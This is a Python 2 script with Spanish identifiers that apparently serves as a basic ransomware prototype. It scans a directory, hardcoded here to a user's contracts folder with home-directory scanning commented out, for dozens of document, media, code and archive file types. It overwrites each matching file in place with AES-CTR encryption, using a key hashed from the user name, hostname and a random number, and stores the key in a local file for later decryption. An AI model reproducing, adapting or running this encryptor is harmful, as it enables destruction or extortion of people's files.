import os
import socket
import hashlib
import random
from Crypto.Util import Counter
from Crypto.Cipher import AES

path = os.environ['HOME']
carpetas= os.listdir(path)
carpetas_no_ocultas= [x for x in carpetas if not x.startswith(".")]
extensiones = ['.au','.avi','.bat','.bmp','.class','.csv','.cvs','.java','.doc','.docx','.gif',
               '.jpg','.jpeg','.mov','.pdf','.png','.ppt','.pptx','.psd','.psp','.tar','.txt','.xls','.xlsx',
               '.zip','.rar','.mpeg','.wmv','.wav','.3gp','.mp4','.mp3',
               '.odt','.tex','.mid','.midi','.ogg','.mpa','.7z','.arj','.tar.gz',
               '.bin','.dmg','.dat','.db',
               '.xml','.sql','.email','.ico','.svg','.html','.css','.scss','.js','.asp','.aspx',
               '.ts','.php','.py','.jsp','.pps','.c','.cpp','.h','.sh','.vb','.ods','.xlsm','.mkv']

def check_internet_connection():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(3) #maxima cantidad de espera
    try:
        s.connect(('socket.io',80))
        print("conectado a internet")
        s.close()
    except:
        print("sin conexion a internet")

def discover(key):
    file_list = open('file_list', 'w+')
    # for carpetas in carpetas_no_ocultas:
    # ruta = path+'/'+carpetas
    ruta = '/home/christian/Escritorio/contratos-bolognia'
    for extension in extensiones:
        for rutaabs, directorio, archivo in os.walk(ruta):
            for file in archivo:
                if file.endswith(extension):
                    file_list.write(os.path.join(rutaabs, file) + '\n')
                    base, exten = os.path.splitext(os.path.join(rutaabs, file))
    file_list.close()

    lista = open('file_list', 'r')
    lista = lista.read().split('\n')
    lista = [l for l in lista if not l == ""]

    if os.path.exists('key_file'):
        key1 = raw_input("Key: ")
        key_file = open('key_file', 'r+')
        key = key_file.read().split('\n')
        key = ''.join(key)
        if key1 == key:
            c = Counter.new(128)
            crypto = AES.new(key, AES.MODE_CTR, counter=c)
            crypt_archivos = crypto.decrypt

            for element in lista:
                encrypt_decrypt(element, crypt_archivos)
    else:
        c = Counter.new(128)
        crypto = AES.new(key, AES.MODE_CTR, counter=c)
        key_file = open('key_file', 'w+')
        key_file.write(key)
        key_file.close()
        crypt_archivos = crypto.encrypt

        for element in lista:
            encrypt_decrypt(element, crypt_archivos)

def get_hash():
    hashcomputer=os.environ['HOME']+os.environ['USER']+socket.gethostname()+str(random.randint(0,10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000))
    hashcomputer=hashlib.sha512(hashcomputer)
    hashcomputer=hashcomputer.hexdigest()
    new_key=[]
    for k in hashcomputer:
        if len(new_key)==32:
            hashcomputer=''.join(new_key)
            break
        else:
            new_key.append(k)
    return hashcomputer

def encrypt_decrypt(archivo,crypto,block_size=16):
    with open(archivo,'r+b') as archivo_enc:
        contenido_sin_cifrar=archivo_enc.read(block_size)
        while contenido_sin_cifrar:
            contenido_cifrado=crypto(contenido_sin_cifrar)
            if len(contenido_sin_cifrar) != len(contenido_cifrado):
                raise ValueError('')
            archivo_enc.seek(-len(contenido_sin_cifrar),1)
            archivo_enc.write(contenido_cifrado)
            contenido_sin_cifrar=archivo_enc.read(block_size)

def main():
    check_internet_connection()
    hashcomputer=get_hash()
    discover(hashcomputer)

if __name__ == '__main__':
    try:
        main()

    except KeyboardInterrupt:
        exit()